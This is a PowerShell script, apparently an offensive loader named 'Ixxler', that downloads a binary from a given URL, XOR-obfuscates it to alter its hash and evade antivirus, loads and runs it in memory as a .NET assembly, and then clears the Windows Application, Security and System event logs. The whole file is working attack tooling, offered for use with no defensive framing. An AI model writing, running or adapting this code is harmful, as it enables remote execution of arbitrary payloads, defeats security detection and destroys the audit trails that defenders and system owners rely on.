<#
    .SYNOPSIS 
    Ixxler - A fileless payload obfuscation and in-memory execution utility.

    .DESCRIPTION
    Ixxler downloads a binary from the specified URL, obfuscates it using a dynamically generated key,
    executes it entirely in memory, and deletes all associated process logs in the system.
    This approach alters the binary's hash to evade static antivirus detection while avoiding a disk footprint.

    .PARAMETER url
    The URL of the binary payload to download.

    .EXAMPLE
    .\Ixxler.ps1 -url "http://yourserver.com/payload.exe"
#>

param(
    [Parameter(Mandatory=$false)]
    [string]$url
)

if (-not $url) {
    Write-Host "Ixxler - A fileless payload obfuscation and in-memory execution utility."
    Write-Host ""
    Write-Host "Usage: .\Ixxler.ps1 -url <URL>"
    Write-Host "Example: .\Ixxler.ps1 -url 'http://yourserver.com/payload.exe'"
    exit
}

Write-Host "[*] Starting Ixxler..."
Write-Host "[+] Target URL: $url"

# Step 1: Dynamic Key Generation
$key = Get-Random -Minimum 0 -Maximum 256
Write-Host "[+] Generated dynamic key: $key"

# Step 2: Define the XOR-Bytes function (operating on a copy)
function XOR-Bytes {
    param (
        [byte[]]$data,
        [byte]$key
    )
    $result = New-Object byte[] ($data.Length)
    for ($i = 0; $i -lt $data.Length; $i++) {
        $result[$i] = $data[$i] -bxor $key
    }
    return $result
}

# Calculate MD5 hash of a byte array
function Get-MD5Hash {
    param(
        [byte[]]$bytes
    )
    $md5 = [System.Security.Cryptography.MD5]::Create()
    $hashBytes = $md5.ComputeHash($bytes)
    return ([BitConverter]::ToString($hashBytes) -replace "-", "").ToLower()
}

# Step 3: Download the binary
Write-Host "[*] Downloading binary from URL..."
$originalBytes = (New-Object System.Net.WebClient).DownloadData($url)
Write-Host "[!] Download complete. Size: $($originalBytes.Length) bytes."

# Save the original binary for debugging
$originalPath = Join-Path (Get-Location) "test_original.exe"
[System.IO.File]::WriteAllBytes($originalPath, $originalBytes)
$origHash = Get-MD5Hash -bytes $originalBytes
# Write-Host "Saved original binary as '$originalPath'. MD5: $origHash"

# Obfuscate the binary
Write-Host "[*] Obfuscating binary using XOR with key $key..."
$obfuscatedBytes = XOR-Bytes -data $originalBytes -key $key
$obfPath = Join-Path (Get-Location) "test_obfuscated.exe"
[System.IO.File]::WriteAllBytes($obfPath, $obfuscatedBytes)
$obfHash = Get-MD5Hash -bytes $obfuscatedBytes
Write-Host "[+] Obfuscation complete. Saved obfuscated binary as '$obfPath'. MD5: $obfHash"

# Step 4: Deobfuscation
# Write-Host "Deobfuscating binary..."
$deobfuscatedBytes = XOR-Bytes -data $obfuscatedBytes -key $key
$deobfPath = Join-Path (Get-Location) "test_deobfuscated.exe"
[System.IO.File]::WriteAllBytes($deobfPath, $deobfuscatedBytes)
$deobfHash = Get-MD5Hash -bytes $deobfuscatedBytes
# Write-Host "Deobfuscation complete. Saved deobfuscated binary as '$deobfPath'. MD5: $deobfHash"

# Uncomment to debug hash comparison
# if ($origHash -eq $deobfHash) {
#     Write-Host "Integrity check passed: deobfuscated binary matches the original."
# } else {
#     Write-Host "Warning: Hash mismatch between original and deobfuscated binary."
# }

# Step 5: Load the assembly
Write-Host "[*] Attempting to load deobfuscated binary into memory as a .NET assembly using Assembly.Load..."
try {
    $assembly = [System.Reflection.Assembly]::Load($deobfuscatedBytes)
    Write-Host "[!] Assembly loaded successfully using Assembly.Load."
}
catch {
    Write-Host "[X] Assembly.Load failed: $_"
    Write-Host "[*] Attempting to load the deobfuscated assembly using Assembly.LoadFile from '$deobfPath'..."
    if (-not (Test-Path $deobfPath)) {
        Write-Host "[X] Error: Could not find file at $deobfPath"
        exit
    }
    try {
        $assembly = [System.Reflection.Assembly]::LoadFile($deobfPath)
        Write-Host "[!] Assembly loaded successfully using Assembly.LoadFile."
    }
    catch {
        Write-Host "[X] Assembly.LoadFile also failed: $_"
        exit
    }
}

# Retrieve the entry point of the assembly
$entryPoint = $assembly.EntryPoint
if ($entryPoint) {
    Write-Host "[!] Found entry point: $($entryPoint.Name)."
    
    $params = $entryPoint.GetParameters()
    Write-Host "[*] Entry point parameter count: $($params.Count)"
    foreach ($p in $params) {
        Write-Host " - Parameter: $($p.Name) of type $($p.ParameterType.FullName)"
    }
    
    try {
        if ($params.Count -eq 0) {
            Write-Host "[*] Invoking entry point with no parameters."
            $entryPoint.Invoke($null, $null)
        }
        elseif ($params.Count -eq 1) {
            if ($params[0].ParameterType -eq [string[]]) {
                Write-Host "[*] Invoking entry point with an explicitly created empty string array."
                # Create an empty string array explicitly.
                $empty = [string[]]::new(0)
                Write-Host "[!] Empty string array created, length: $($empty.Length)"
                # Use the comma operator to build a one-element object array.
                $arguments = ,$empty
                $entryPoint.Invoke($null, $arguments)
            }
            else {
                Write-Host "[*] Invoking entry point with $null for parameter of type $($params[0].ParameterType.FullName)."
                $arguments = [object[]]@($null)
                $entryPoint.Invoke($null, $arguments)
            }
        }
        else {
            Write-Host "[X] Unexpected number of parameters ($($params.Count)) for entry point."
        }
        Write-Host "[!] Execution complete."
    }
    catch {
        Write-Host "[X] Error invoking entry point: $_"
    }
} else {
    Write-Host "[X] No entry point found in the assembly."
}

# Step 6: Delete associated logs 
Write-Host "Attempting to clear selected Windows event logs..."
# NOTE: You need admin privileges
$logsToClear = @("Application", "Security", "System")
foreach ($log in $logsToClear) {
    try {
        wevtutil cl $log
        Write-Host "[!] Cleared event log: $log"
    }
    catch {
        Write-Host "[X] Failed to clear event log: $log. Error: $_"
    }
}
Write-Host "[!] Log clearing complete."
